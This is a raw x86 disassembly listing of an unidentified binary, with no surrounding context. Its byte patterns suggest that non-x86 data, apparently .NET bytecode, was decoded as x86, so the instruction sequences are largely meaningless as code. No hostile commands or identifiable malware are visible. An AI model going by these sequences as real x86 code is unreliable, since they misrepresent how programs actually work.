  402cf6:	add    bh,BYTE PTR [ebx+0x45]
  402cf9:	add    BYTE PTR [eax],al
  402cfb:	add    al,0x8e
  402cfd:	imul   esi,DWORD PTR [edx],0x1d2c089c
  402d03:	add    al,0x2
  402d05:	jnp    0x402d4d
  402d07:	add    BYTE PTR [eax],al
  402d09:	add    al,0x9
  402d0b:	nop
  402d0c:	push   edx
  402d0d:	add    eax,0x477b02
  402d12:	add    BYTE PTR [ecx+ecx*1],al
  402d15:	nop
  402d16:	push   edx
  402d17:	add    bh,BYTE PTR [ebx+0x45]
  402d1a:	add    BYTE PTR [eax],al
  402d1c:	add    al,0x9
  402d1e:	call   0x7000:0x39d722a
  402d25:	add    ebp,DWORD PTR [eax]
  402d27:	add    eax,0x73060000
  402d2c:	sbb    BYTE PTR [eax],al
  402d2e:	add    BYTE PTR [edx],cl
  402d30:	jp     0x402d32
  402d32:	add    BYTE PTR [eax],al
  402d34:	adc    esi,DWORD PTR [eax]
  402d36:	add    eax,0x1ca00
  402d3b:	add    BYTE PTR [ebx],cl
  402d3d:	add    BYTE PTR [eax],al
  402d3f:	adc    DWORD PTR [edx],eax
  402d41:	sub    BYTE PTR [esi],bl
  402d43:	add    BYTE PTR [eax],al
  402d45:	or     al,BYTE PTR [edx]
  402d47:	add    al,0x73
  402d49:	sbb    eax,DWORD PTR [eax]
  402d4b:	add    BYTE PTR [esi],al
  402d4d:	jge    0x402d9b
  402d4f:	add    BYTE PTR [eax],al
  402d51:	add    al,0x3
  402d53:	mov    gs,WORD PTR [ecx-0x73]
  402d56:	add    BYTE PTR es:[eax],al
  402d59:	add    DWORD PTR ds:0x8d698e03,ecx
  402d5f:	or     DWORD PTR [eax],eax
  402d61:	add    BYTE PTR [edx],al
  402d63:	adc    eax,DWORD PTR [esi+edx*1]
  402d66:	or     edx,DWORD PTR [esi]
  402d68:	or     al,0x16
  402d6a:	or     bh,BYTE PTR [eax]
  402d6c:	dec    edi
  402d6d:	add    DWORD PTR [eax],eax
  402d6f:	add    BYTE PTR [ebx],al
  402d71:	push   es
  402d72:	call   0x6f70:0x3c172
  402d79:	dec    esp
  402d7a:	add    BYTE PTR [eax],al
  402d7c:	or     ch,BYTE PTR ds:0x9a060312
  402d82:	jb     0x402d49
  402d84:	add    eax,DWORD PTR [eax]
  402d86:	jo     0x402df7
  402d88:	dec    esp
  402d89:	add    BYTE PTR [eax],al
  402d8b:	or     bh,BYTE PTR [ecx]
  402d8d:	and    BYTE PTR [ecx],al
  402d8f:	add    BYTE PTR [eax],al
  402d91:	adc    al,0x13
  402d93:	push   es
  402d94:	add    eax,DWORD PTR [esi]
  402d96:	call   0x100:0x3b8d18
  402d9d:	adc    ecx,DWORD PTR [edx]
  402d9f:	adc    DWORD PTR [edx],ecx
  402da1:	push   ss
  402da2:	pop    ds
  402da3:	cmp    bl,BYTE PTR [ebp+0x1f170a11]
  402da9:	cmp    eax,0x6f0a119d
  402dae:	dec    esi
  402daf:	add    BYTE PTR [eax],al
  402db1:	or     dl,BYTE PTR [ebx]
  402db3:	or     DWORD PTR [ecx],edx
  402db5:	or     DWORD PTR ds:0x6030d33,edx
  402dbb:	call   0xa00:0x4d6f17
  402dc2:	adc    eax,DWORD PTR ds:0x6030f2b
  402dc8:	call   0x6f59:0x17091117
  402dcf:	dec    edi
  402dd0:	add    BYTE PTR [eax],al
  402dd2:	or     dl,BYTE PTR [ebx]
  402dd4:	add    eax,0x4c7b02
  402dd9:	add    BYTE PTR [ecx+edx*1],al
  402ddc:	add    eax,0x8120712
  402de1:	outs   dx,DWORD PTR ds:[esi]
  402de2:	sbb    al,0x0
  402de4:	add    BYTE PTR [esi],al
  402de6:	adc    eax,DWORD PTR ds:0x172d0811
  402dec:	adc    DWORD PTR [ecx],ecx
  402dee:	adc    eax,0xc972122e
  402df3:	add    eax,DWORD PTR [eax]
  402df5:	jo     0x402e08
  402df7:	add    eax,0x528
  402dfc:	push   es
  402dfd:	jae    0x402e17
  402dff:	add    BYTE PTR [eax],al
  402e01:	or     bh,BYTE PTR [edx+0x11]
  402e04:	pop    es
  402e05:	sub    al,0x17
  402e07:	adc    DWORD PTR [ecx],ecx
  402e09:	adc    eax,0xf1721233
  402e0e:	add    eax,DWORD PTR [eax]
  402e10:	jo     0x402e23
  402e12:	add    eax,0x528
  402e17:	push   es
  402e18:	jae    0x402e32
  402e1a:	add    BYTE PTR [eax],al
  402e1c:	or     bh,BYTE PTR [edx+0x11]
  402e1f:	or     BYTE PTR [esp+edi*2],ch
  402e22:	adc    DWORD PTR [ecx],ecx
  402e24:	adc    eax,0x911772e
  402e29:	add    eax,DWORD PTR [esi]
  402e2b:	call   0x170a:0x276f
  402e32:	pop    ecx
  402e33:	xor    ebx,DWORD PTR [ebx+0x6]
  402e36:	pop    ss
  402e37:	pop    eax
  402e38:	add    ecx,DWORD PTR [esi+0x72123369]
  402e3e:	icebp  
  402e3f:	add    eax,DWORD PTR [eax]
  402e41:	jo     0x402e54
  402e43:	add    eax,0x528
  402e48:	push   es
  402e49:	jae    0x402e63
  402e4b:	add    BYTE PTR [eax],al
  402e4d:	or     bh,BYTE PTR [edx+0x3]
  402e50:	push   es
  402e51:	pop    ss
  402e52:	pop    eax
  402e53:	call   0x6f70:0x3c172
  402e5a:	dec    esp
  402e5b:	add    BYTE PTR [eax],al
  402e5d:	or     ch,BYTE PTR ds:0x17060311
  402e63:	pop    eax
  402e64:	call   0x6f70:0x3c572
  402e6b:	dec    esp
  402e6c:	add    BYTE PTR [eax],al
  402e6e:	or     ch,BYTE PTR [edx+edx*1]
  402e71:	jb     0x402e64
  402e73:	add    eax,DWORD PTR [eax]
  402e75:	jo     0x402e88
  402e77:	add    eax,0x528
  402e7c:	push   es
  402e7d:	jae    0x402e97
  402e7f:	add    BYTE PTR [eax],al
  402e81:	or     bh,BYTE PTR [edx+0x3]
  402e84:	push   es
  402e85:	pop    ss
  402e86:	pop    eax
  402e87:	call   0xa58:0x17060613
  402e8e:	sub    ecx,DWORD PTR [esi]
  402e90:	add    eax,DWORD PTR [esi]
  402e92:	call   0x4d6f:0x58170911
  402e99:	add    BYTE PTR [eax],al
  402e9b:	or     dl,BYTE PTR [ebx]
  402e9d:	push   es
  402e9e:	adc    DWORD PTR [eax+ecx*1],eax
  402ea1:	and    eax,0x110c5817
  402ea6:	add    eax,0x18730611
  402eab:	add    BYTE PTR [eax],al
  402ead:	push   es
  402eae:	mov    ds:0x7090a2b,al
  402eb3:	and    eax,0x30b5817
  402eb8:	push   es
  402eb9:	call   0x60a:0x581706a2
  402ec0:	add    ecx,DWORD PTR [esi-0x157c097]
  402ec6:	(bad)  
  402ec7:	inc    DWORD PTR [edx]
  402ec9:	pop    es
  402eca:	lea    esp,[esi]
  402ecc:	add    BYTE PTR [eax],al
  402ece:	add    DWORD PTR [ebp+0x48],edi
  402ed1:	add    BYTE PTR [eax],al
  402ed3:	add    al,0x2
  402ed5:	or     BYTE PTR [ebp+0x2000009],cl
  402edb:	jge    0x402f26
  402edd:	add    BYTE PTR [eax],al
  402edf:	add    al,0x9
  402ee1:	add    bh,BYTE PTR [ebx+0x48]
  402ee4:	add    BYTE PTR [eax],al
  402ee6:	add    al,0x7
  402ee8:	sub    BYTE PTR [eax+0x0],dl
  402eeb:	add    BYTE PTR [edx],cl
  402eed:	adc    DWORD PTR [edx+eax*1],eax
  402ef0:	jnp    0x402f3b
  402ef2:	add    BYTE PTR [eax],al
  402ef4:	add    al,0x8
  402ef6:	sub    BYTE PTR [eax+0x0],dl
  402ef9:	add    BYTE PTR [edx],cl
  402efb:	add    dl,BYTE PTR [esi]
  402efd:	jge    0x402f49
  402eff:	add    BYTE PTR [eax],al
  402f01:	add    al,0x2
  402f03:	push   ss
  402f04:	jge    0x402f51
  402f06:	add    BYTE PTR [eax],al
  402f08:	add    al,0x2a
  402f0a:	add    bh,BYTE PTR es:[ebx+0x48]
  402f0e:	add    BYTE PTR [eax],al
  402f10:	add    al,0x8e
  402f12:	imul   ebp,DWORD PTR [edx],0x497b0226
  402f18:	add    BYTE PTR [eax],al
  402f1a:	add    al,0x8e
  402f1c:	imul   ebp,DWORD PTR [edx],0x30130000
  402f22:	add    al,0x0
  402f24:	sub    eax,DWORD PTR [eax]
  402f26:	add    BYTE PTR [eax],al
  402f28:	add    eax,DWORD PTR [eax]
  402f2a:	add    BYTE PTR [ecx],dl
  402f2c:	add    bh,BYTE PTR [ebx+0x4a]
  402f2f:	add    BYTE PTR [eax],al
  402f31:	add    al,0x2
  402f33:	jnp    0x402f7d
  402f35:	add    BYTE PTR [eax],al
  402f37:	add    al,0x8e
  402f39:	imul   esi,DWORD PTR [edx],0x22a1402
  402f3f:	jnp    0x402f89
  402f41:	add    BYTE PTR [eax],al
  402f43:	add    al,0x2
  402f45:	and    eax,0x4a7b
  402f4a:	add    al,0x25
  402f4c:	or     dl,BYTE PTR [edi]
  402f4e:	pop    eax
  402f4f:	jge    0x402f9b
  402f51:	add    BYTE PTR [eax],al
  402f53:	add    al,0x6
  402f55:	call   0x4:0x3013002a
  402f5c:	sub    eax,DWORD PTR [eax]
  402f5e:	add    BYTE PTR [eax],al
  402f60:	add    eax,DWORD PTR [eax]
  402f62:	add    BYTE PTR [ecx],dl
  402f64:	add    bh,BYTE PTR [ebx+0x4b]
  402f67:	add    BYTE PTR [eax],al
  402f69:	add    al,0x2
  402f6b:	jnp    0x402fb6
  402f6d:	add    BYTE PTR [eax],al
  402f6f:	add    al,0x8e
  402f71:	imul   esi,DWORD PTR [edx],0x22a1402
  402f77:	jnp    0x402fc2
  402f79:	add    BYTE PTR [eax],al
  402f7b:	add    al,0x2
  402f7d:	and    eax,0x4b7b
  402f82:	add    al,0x25
  402f84:	or     dl,BYTE PTR [edi]
  402f86:	pop    eax
  402f87:	jge    0x402fd4
  402f89:	add    BYTE PTR [eax],al
  402f8b:	add    al,0x6
  402f8d:	call   0x2:0x3013002a
  402f94:	bound  eax,QWORD PTR [eax]
  402f96:	add    BYTE PTR [eax],al
  402f98:	or     al,0x0
  402f9a:	add    BYTE PTR [ecx],dl
  402f9c:	jae    0x402ff2
  402f9e:	add    BYTE PTR [eax],al
  402fa0:	push   es
  402fa1:	or     al,BYTE PTR [esi]
  402fa3:	add    edi,DWORD PTR [ebp+0x5f]
  402fa6:	add    BYTE PTR [eax],al
  402fa8:	add    al,0x6
  402faa:	add    al,0x7d
  402fac:	pusha  
  402fad:	add    BYTE PTR [eax],al
  402faf:	add    al,0x6
  402fb1:	add    eax,0x617d
  402fb6:	add    al,0x6
  402fb8:	push   cs
  402fb9:	add    al,0x7d
  402fbb:	bound  eax,QWORD PTR [eax]
  402fbd:	add    BYTE PTR [esi+eax*1],al
  402fc0:	push   cs
  402fc1:	add    eax,0x637d
  402fc6:	add    al,0x6
  402fc8:	push   cs
  402fc9:	push   es
  402fca:	jge    0x403030
  402fcc:	add    BYTE PTR [eax],al
  402fce:	add    al,0x6
  402fd0:	push   cs
  402fd1:	pop    es
  402fd2:	jge    0x403039
  402fd4:	add    BYTE PTR [eax],al
  402fd6:	add    al,0x6
  402fd8:	push   cs
  402fd9:	or     BYTE PTR [ebp+0x66],bh
  402fdc:	add    BYTE PTR [eax],al
  402fde:	add    al,0x6
  402fe0:	push   cs
  402fe1:	or     DWORD PTR [ebp+0x67],edi
  402fe4:	add    BYTE PTR [eax],al
  402fe6:	add    al,0x6
  402fe8:	push   cs
  402fe9:	or     bh,BYTE PTR [ebp+0x68]
  402fec:	add    BYTE PTR [eax],al
  402fee:	add    al,0x6
  402ff0:	push   cs
  402ff1:	or     edi,DWORD PTR [ebp+0x69]
  402ff4:	add    BYTE PTR [eax],al
  402ff6:	add    al,0x6
  402ff8:	sub    BYTE PTR [esi],ch
  402ffa:	add    BYTE PTR [eax],al
  402ffc:	push   es
  402ffd:	sub    bl,BYTE PTR [esi]
  402fff:	add    ch,BYTE PTR [eax]
  403001:	push   ecx
  403002:	add    BYTE PTR [eax],al
  403004:	or     ch,BYTE PTR [edx]
  403006:	jb     0x40300a
  403008:	sub    BYTE PTR [esi],bl
  40300a:	add    BYTE PTR [eax],al
  40300c:	or     al,BYTE PTR [edx]
  40300e:	add    edi,DWORD PTR [ebp+0x53]
  403011:	add    BYTE PTR [eax],al
  403013:	add    al,0x2
  403015:	add    al,0x7d
  403017:	push   esp
  403018:	add    BYTE PTR [eax],al
  40301a:	add    al,0x2
  40301c:	add    eax,0x557d
  403021:	add    al,0x2a
  403023:	add    BYTE PTR [ebx],dl
  403025:	xor    BYTE PTR [edx],al
  403027:	add    BYTE PTR [esi],bh
  403029:	add    BYTE PTR [eax],al
  40302b:	add    BYTE PTR ds:0x3110000,cl
  403031:	jne    0x403041
  403033:	add    BYTE PTR [eax],al
  403035:	add    cl,BYTE PTR [edx]
  403037:	push   es
  403038:	sub    eax,0x62a1602
  40303d:	jnp    0x403092
  40303f:	add    BYTE PTR [eax],al
  403041:	add    al,0x2
  403043:	jnp    0x403098
  403045:	add    BYTE PTR [eax],al
  403047:	add    al,0x28
  403049:	push   edx
  40304a:	add    BYTE PTR [eax],al
  40304c:	or     ch,BYTE PTR [ebx*1+0x547b06]
  403053:	add    BYTE PTR [edx+eax*1],al
  403056:	jnp    0x4030ac
  403058:	add    BYTE PTR [eax],al
  40305a:	add    al,0x33
  40305c:	clts   
  40305e:	jnp    0x4030b5
  403060:	add    BYTE PTR [eax],al
  403062:	add    al,0x2
  403064:	jnp    0x4030bb
  403066:	add    BYTE PTR [eax],al
  403068:	add    al,0xfe
  40306a:	add    DWORD PTR [edx],ebp
  40306c:	push   ss
  40306d:	sub    al,BYTE PTR [edx+0x537c02]
  403073:	add    BYTE PTR [esi+edi*8],al
  403076:	push   ss
  403077:	or     DWORD PTR [eax],eax
  403079:	add    BYTE PTR [ecx],al
  40307b:	outs   dx,DWORD PTR ds:[esi]
  40307c:	push   ebx
  40307d:	add    BYTE PTR [eax],al
  40307f:	or     al,BYTE PTR [edx]
  403081:	jnp    0x4030d7
  403083:	add    BYTE PTR [eax],al
  403085:	add    al,0x58
  403087:	add    bh,BYTE PTR [ebx+0x55]
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    al,0x58
  40308e:	sub    bl,BYTE PTR [esi]
  403090:	add    bh,BYTE PTR [ebx+0x53]
  403093:	add    BYTE PTR [eax],al
  403095:	add    al,0x2a
  403097:	push   ds
  403098:	add    bh,BYTE PTR [ebx+0x54]
  40309b:	add    BYTE PTR [eax],al
  40309d:	add    al,0x2a
  40309f:	push   ds
  4030a0:	add    bh,BYTE PTR [ebx+0x55]
  4030a3:	add    BYTE PTR [eax],al
  4030a5:	add    al,0x2a
  4030a7:	cmp    al,BYTE PTR [edx]
  4030a9:	sub    BYTE PTR [esi],bl
  4030ab:	add    BYTE PTR [eax],al
  4030ad:	or     al,BYTE PTR [edx]
  4030af:	add    edi,DWORD PTR [ebp+0x56]
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	add    al,0x2a
  4030b6:	push   ds
  4030b7:	add    bh,BYTE PTR [ebx+0x56]
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	add    al,0x2a
  4030be:	push   ds
  4030bf:	add    bh,BYTE PTR [ebx+0x57]
  4030c2:	add    BYTE PTR [eax],al
  4030c4:	add    al,0x2a
  4030c6:	and    al,BYTE PTR [edx]
  4030c8:	add    edi,DWORD PTR [ebp+0x57]
  4030cb:	add    BYTE PTR [eax],al
  4030cd:	add    al,0x2a
  4030cf:	add    BYTE PTR [ebx],bl
  4030d1:	xor    BYTE PTR [ebx],al
  4030d3:	add    BYTE PTR [ecx+eax*1+0x0],al
  4030d7:	add    BYTE PTR [esi],cl
  4030d9:	add    BYTE PTR [eax],al
  4030db:	adc    DWORD PTR [edx],eax
  4030dd:	sbb    BYTE PTR [ebx+0x0],0x0
  4030e1:	add    al,0x2
  4030e3:	jnp    0x40314c
  4030e5:	add    BYTE PTR [eax],al
  4030e7:	add    al,0x28
  4030e9:	popa   
  4030ea:	add    BYTE PTR [eax],al
  4030ec:	push   es
  4030ed:	push   ss
  4030ee:	or     bh,BYTE PTR [esi+0x5b]
  4030f1:	add    BYTE PTR [eax],al
  4030f3:	add    al,0x7b
  4030f5:	add    BYTE PTR gs:[eax],al
  4030f8:	add    al,0x73
  4030fa:	inc    esp
  4030fb:	add    BYTE PTR [eax],al
  4030fd:	push   es
  4030fe:	sbb    BYTE PTR [ebp+0x0],0x0
  403102:	add    al,0x7e
  403104:	pop    ebx
  403105:	add    BYTE PTR [eax],al
  403107:	add    al,0x7b
  403109:	pop    edi
  40310a:	add    BYTE PTR [eax],al
  40310c:	add    al,0x28
  40310e:	push   esp
  40310f:	add    BYTE PTR [eax],al
  403111:	or     cl,BYTE PTR [ebx]
  403113:	pop    es
  403114:	add    bh,BYTE PTR [ebx+0x69]
  403117:	add    BYTE PTR [eax],al
  403119:	add    al,0x28
  40311b:	xor    eax,0x2c060000
  403120:	sbb    DWORD PTR [edx],eax
  403122:	jnp    0x403187
  403124:	add    BYTE PTR [eax],al
  403126:	add    al,0x8e
  403128:	imul   ebp,DWORD PTR ds:0x415720f,0x4287000
  403132:	add    BYTE PTR [eax],al
  403134:	push   es
  403135:	sub    BYTE PTR [ebx+0x0],bl
  403138:	add    BYTE PTR [esi],al
  40313a:	pop    es
  40313b:	add    bh,BYTE PTR [ebx+0x69]
  40313e:	add    BYTE PTR [eax],al
  403140:	add    al,0x28
  403142:	add    BYTE PTR ss:[eax],al
  403145:	push   es
  403146:	sub    al,0xf
  403148:	jb     0x40318d
  40314a:	add    al,0x0
  40314c:	jo     0x403176
  40314e:	add    al,0x0
  403150:	add    BYTE PTR [esi],al
  403152:	sub    BYTE PTR [ebx+0x0],bl
  403155:	add    BYTE PTR [esi],al
  403157:	jle    0x4031b4
  403159:	add    BYTE PTR [eax],al
  40315b:	add    al,0x7b
  40315d:	pusha  
  40315e:	add    BYTE PTR [eax],al
  403160:	add    al,0x2d
  403162:	cs jle 0x4031c0
  403165:	add    BYTE PTR [eax],al
  403167:	add    al,0x7e
  403169:	pop    ebx
  40316a:	add    BYTE PTR [eax],al
  40316c:	add    al,0x7b
  40316e:	popa   
  40316f:	add    BYTE PTR [eax],al
  403171:	add    al,0x7
  403173:	outs   dx,DWORD PTR ds:[esi]
  403174:	sub    eax,0x6f0a0000
  403179:	push   ebp
  40317a:	add    BYTE PTR [eax],al
  40317c:	or     ch,BYTE PTR [eax]
  40317e:	push   esi
  40317f:	add    BYTE PTR [eax],al
  403181:	or     dh,BYTE PTR [edx+0x6d]
  403184:	add    al,0x0
  403186:	jo     0x4031b0
  403188:	push   edi
  403189:	add    BYTE PTR [eax],al
  40318b:	or     bh,BYTE PTR [ebp+0x60]
  40318e:	add    BYTE PTR [eax],al
  403190:	add    al,0x7e
  403192:	pop    ebx
  403193:	add    BYTE PTR [eax],al
  403195:	add    al,0x7b
  403197:	add    BYTE PTR [bx+si],al
  40319a:	add    al,0x2d
  40319c:	sub    bh,BYTE PTR [esi+0x5b]
  40319f:	add    BYTE PTR [eax],al
  4031a1:	add    al,0x7b
  4031a3:	pop    edi
  4031a4:	add    BYTE PTR [eax],al
  4031a6:	add    al,0x28
  4031a8:	xor    DWORD PTR [eax],eax
  4031aa:	add    BYTE PTR [esi],al
  4031ac:	sub    al,0x19
  4031ae:	jb     0x403227
  4031b0:	add    al,0x0
  4031b2:	jo     0x403232
  4031b4:	pop    ebx
  4031b5:	add    BYTE PTR [eax],al
  4031b7:	add    al,0x7b
  4031b9:	pop    edi
  4031ba:	add    BYTE PTR [eax],al
  4031bc:	add    al,0x28
  4031be:	add    eax,0x28060000
  4031c3:	pop    ebx
  4031c4:	add    BYTE PTR [eax],al
  4031c6:	push   es
  4031c7:	sub    BYTE PTR [edx],dh
  4031c9:	add    BYTE PTR [eax],al
  4031cb:	push   es
  4031cc:	sub    eax,0xd641f05
  4031d1:	fimul  WORD PTR [ebx+0x7]
  4031d4:	jle    0x403231
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	add    al,0x7b
  4031da:	pusha  
  4031db:	add    BYTE PTR [eax],al
  4031dd:	add    al,0x28
  4031df:	das    
  4031e0:	add    BYTE PTR [eax],al
  4031e2:	push   es
  4031e3:	es jle 0x403241
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	add    al,0x7b
  4031ea:	add    BYTE PTR [bx+si],al
  4031ed:	add    al,0x2d
  4031ef:	sbb    DWORD PTR [edx-0x53],esi
  4031f2:	add    al,0x0
  4031f4:	jo     0x403274
  4031f6:	pop    ebx
  4031f7:	add    BYTE PTR [eax],al
  4031f9:	add    al,0x7b
  4031fb:	pusha  
  4031fc:	add    BYTE PTR [eax],al
  4031fe:	add    al,0x28
  403200:	add    eax,0x28060000
  403205:	pusha  
  403206:	add    BYTE PTR [eax],al
  403208:	push   es
  403209:	ficom  WORD PTR [ecx]
  40320b:	or     al,0x8
  40320d:	outs   dx,DWORD PTR ds:[esi]
  40320e:	xor    al,BYTE PTR [eax]
  403210:	add    BYTE PTR [edx],cl
  403212:	sub    BYTE PTR [ebp+0x0],dl
  403215:	add    BYTE PTR [esi],al
  403217:	pop    ds
  403218:	fs or  bl,dh
  40321b:	add    BYTE PTR [esi],al
  40321d:	sub    cl,BYTE PTR [ecx]
  40321f:	sub    al,BYTE PTR [ecx+0x1c]
  403222:	add    BYTE PTR [eax],al
  403224:	add    BYTE PTR [eax],al
  403226:	add    BYTE PTR [eax],al
  403228:	adc    eax,DWORD PTR [eax]
  40322a:	add    BYTE PTR [eax],al
  40322c:	sbb    al,0x1
  40322e:	add    BYTE PTR [eax],al
  403230:	das    
  403231:	add    DWORD PTR [eax],eax
  403233:	add    BYTE PTR [ecx],dl
  403235:	add    BYTE PTR [eax],al
  403237:	add    BYTE PTR [eax+eax*1],cl
  40323a:	add    BYTE PTR [ecx],al
  40323c:	sbb    esi,DWORD PTR [eax]
  40323e:	add    eax,0x4b00
  403243:	add    BYTE PTR [edi],cl
  403245:	add    BYTE PTR [eax],al
  403247:	adc    DWORD PTR [ebx+0x58],esi
  40324a:	add    BYTE PTR [eax],al
  40324c:	or     cl,BYTE PTR [edx]
  40324e:	jae    0x4032a3
  403250:	add    BYTE PTR [eax],al
  403252:	push   es
  403253:	or     eax,DWORD PTR [esi]
  403255:	add    al,BYTE PTR [ebx]
  403257:	jle    0x4032b4
  403259:	add    BYTE PTR [eax],al
  40325b:	add    al,0x7b
  40325d:	imul   eax,DWORD PTR [eax],0x6f070400
  403263:	pop    ecx
  403264:	add    BYTE PTR [eax],al
  403266:	or     dh,BYTE PTR [edx+ecx*1+0x0]
  40326a:	add    BYTE PTR [ecx],al
  40326c:	or     al,0x8
  40326e:	je     0x403284
  403270:	add    BYTE PTR [eax],al
  403272:	add    cl,BYTE PTR ds:0x4f6f09
  403278:	add    BYTE PTR [esi],al
  40327a:	ficom  WORD PTR ds:0xd7720413
  403280:	add    al,0x0
  403282:	jo     0x4032ac
  403284:	add    al,0x0
  403286:	add    BYTE PTR [esi],al
  403288:	adc    DWORD PTR [eax+ebp*1],eax
  40328b:	cmp    DWORD PTR [eax],eax
  40328d:	add    BYTE PTR [esi],al
  40328f:	fiadd  WORD PTR [eax]
  403291:	or     BYTE PTR [edx],ch
  403293:	add    BYTE PTR [ecx],al
  403295:	adc    BYTE PTR [eax],al
  403297:	add    BYTE PTR [eax],al
  403299:	add    BYTE PTR ds:0x340f00,ah
  40329f:	adc    eax,0x100000c
  4032a4:	stos   BYTE PTR es:[edi],al
  4032a5:	jle    0x403302
  4032a7:	add    BYTE PTR [eax],al
  4032a9:	add    al,0x7b
  4032ab:	imul   eax,DWORD PTR [eax],0x37280400
  4032b1:	add    BYTE PTR [eax],al
  4032b3:	push   es
  4032b4:	sub    al,0x3
  4032b6:	pop    ds
  4032b7:	inc    edx
  4032b8:	sub    bh,BYTE PTR [esi+0x5b]
  4032bb:	add    BYTE PTR [eax],al
  4032bd:	add    al,0x7b
  4032bf:	imul   eax,DWORD PTR [eax],0x38280400
  4032c5:	add    BYTE PTR [eax],al
  4032c7:	push   es
  4032c8:	sub    al,0x3
  4032ca:	pop    ds
  4032cb:	and    ch,BYTE PTR [edx]
  4032cd:	sbb    BYTE PTR [edx],ch
  4032cf:	add    BYTE PTR [ebx],dl
  4032d1:	xor    BYTE PTR [ebx],al
  4032d3:	add    BYTE PTR [eax],ah
  4032d5:	add    BYTE PTR [eax],al
  4032d7:	add    BYTE PTR [eax],dl
  4032d9:	add    BYTE PTR [eax],al
  4032db:	adc    DWORD PTR [edx+ecx*1],edx
  4032de:	jle    0x40333b
  4032e0:	add    BYTE PTR [eax],al
  4032e2:	add    al,0x7b
  4032e4:	pop    edi
  4032e5:	add    BYTE PTR [eax],al
  4032e7:	add    al,0x28
  4032e9:	xor    BYTE PTR [eax],al
  4032eb:	add    BYTE PTR [esi],al
  4032ed:	adc    al,BYTE PTR [eax]
  4032ef:	sub    BYTE PTR [eax+eax*1],bh
  4032f2:	add    BYTE PTR [esi],al
  4032f4:	or     eax,DWORD PTR [edi]
  4032f6:	sub    al,0x2
  4032f8:	adc    al,0xa
  4032fa:	push   es
  4032fb:	sub    bl,BYTE PTR [ebx]
  4032fd:	xor    BYTE PTR [esi],al
  4032ff:	add    BYTE PTR [esi],dh
  403301:	add    DWORD PTR [eax],eax
  403303:	add    BYTE PTR [ecx],dl
  403305:	add    BYTE PTR [eax],al
  403307:	adc    DWORD PTR [esi+0x5b],edi
  40330a:	add    BYTE PTR [eax],al
  40330c:	add    al,0x7b
  40330e:	arpl   WORD PTR [eax],ax
  403310:	add    BYTE PTR [esi+ecx*4],al
  403313:	imul   esi,DWORD PTR [ebx+0x5a],0x800a0000
  40331a:	pop    esp
  40331b:	add    BYTE PTR [eax],al
  40331d:	add    al,0x7e
  40331f:	pop    ebx
  403320:	add    BYTE PTR [eax],al
  403322:	add    al,0x7b
  403324:	arpl   WORD PTR [eax],ax
  403326:	add    BYTE PTR [ebx+edx*1],al
  403329:	or     edx,DWORD PTR [esi]
  40332b:	adc    ecx,DWORD PTR [eax+edi*1]
  40332e:	cld    
  40332f:	add    BYTE PTR [eax],al
  403331:	add    BYTE PTR [ecx],dl
  403333:	or     edx,DWORD PTR [ecx]
  403335:	or     al,0x9a
  403337:	or     al,BYTE PTR [esi]
  403339:	adc    al,BYTE PTR [ecx]
  40333b:	adc    al,BYTE PTR [edx+edx*1]
  40333e:	add    eax,0x3120212
  403343:	sub    BYTE PTR [esi],bh
  403345:	add    BYTE PTR [eax],al
  403347:	push   es
  403348:	jle    0x4033a6
  40334a:	add    BYTE PTR [eax],al
  40334c:	add    al,0x7
  40334e:	or     BYTE PTR [ecx],cl
  403350:	jae    0x403376
  403352:	add    BYTE PTR [eax],al
  403354:	push   es
  403355:	push   es
  403356:	jae    0x403382
  403358:	add    BYTE PTR [eax],al
  40335a:	push   es
  40335b:	outs   dx,DWORD PTR ds:[esi]
  40335c:	pop    ebx
  40335d:	add    BYTE PTR [eax],al
  40335f:	or     bl,dh
  403361:	sbb    DWORD PTR [esi],esp
  403363:	jb     0x40336a
  403365:	add    eax,0x28067000
  40336a:	add    eax,0x28060000
  40336f:	push   ebp
  403370:	add    BYTE PTR [eax],al
  403372:	push   es
  403373:	push   ss
  403374:	adc    ecx,DWORD PTR [edx]
  403376:	ffree  st(0)
  403378:	add    BYTE PTR [eax],al
  40337a:	add    ch,bl
  40337c:	test   al,0x0
  40337e:	add    BYTE PTR [eax],al
  403380:	adc    eax,DWORD PTR [esi]
  403382:	sbb    ecx,DWORD PTR [ebp+0x1000026]
  403388:	adc    ecx,DWORD PTR ds:0x11160d11
  40338e:	push   es
  40338f:	outs   dx,DWORD PTR ds:[esi]
  403390:	xor    eax,DWORD PTR [eax]
  403392:	add    BYTE PTR [edx],cl
  403394:	outs   dx,DWORD PTR ds:[esi]
  403395:	xor    al,0x0
  403397:	add    BYTE PTR [edx],cl
  403399:	mov    ds:0x72170d11,al
  40339e:	sub    eax,0xa2700005
  4033a3:	adc    DWORD PTR ds:0x6f061118,ecx
  4033a9:	pop    esp
  4033aa:	add    BYTE PTR [eax],al
  4033ac:	or     dl,BYTE PTR [ebx]
  4033ae:	push   cs
  4033af:	adc    cl,BYTE PTR [esi]
  4033b1:	jb     0x4033e8
  4033b3:	add    eax,0x5d287000
  4033b8:	add    BYTE PTR [eax],al
  4033ba:	or     ah,BYTE PTR [edx+0x72190d11]
  4033c0:	cmp    eax,DWORD PTR ds:0x11a27000
  4033c6:	or     eax,0x6f06111a
  4033cb:	xor    al,BYTE PTR [eax]
  4033cd:	add    BYTE PTR [edx],cl
  4033cf:	mov    ds:0x5e280d11,al
  4033d4:	add    BYTE PTR [eax],al
  4033d6:	or     dl,BYTE PTR [ebx]
  4033d8:	pop    es
  4033d9:	jb     0x40341e
  4033db:	add    eax,0x11067000
  4033e0:	pop    es
  4033e1:	sub    BYTE PTR [esi],al
  4033e3:	add    BYTE PTR [eax],al
  4033e5:	push   es
  4033e6:	sub    BYTE PTR [ebp+0x0],dl
  4033e9:	add    BYTE PTR [esi],al
  4033eb:	push   ss
  4033ec:	adc    ecx,DWORD PTR [edx]
  4033ee:	fimul  WORD PTR [ebx+0x13]
  4033f1:	or     BYTE PTR [ecx],dl
  4033f3:	or     BYTE PTR [edi+0x33],ch
  4033f6:	add    BYTE PTR [eax],al
  4033f8:	or     ch,BYTE PTR [edi+0x34]
  4033fb:	add    BYTE PTR [eax],al
  4033fd:	or     dh,BYTE PTR [edx+0x63]
  403400:	add    eax,0x8117000
  403405:	outs   dx,DWORD PTR ds:[esi]
  403406:	xor    al,BYTE PTR [eax]
  403408:	add    BYTE PTR [edx],cl
  40340a:	sub    BYTE PTR [edi],dl
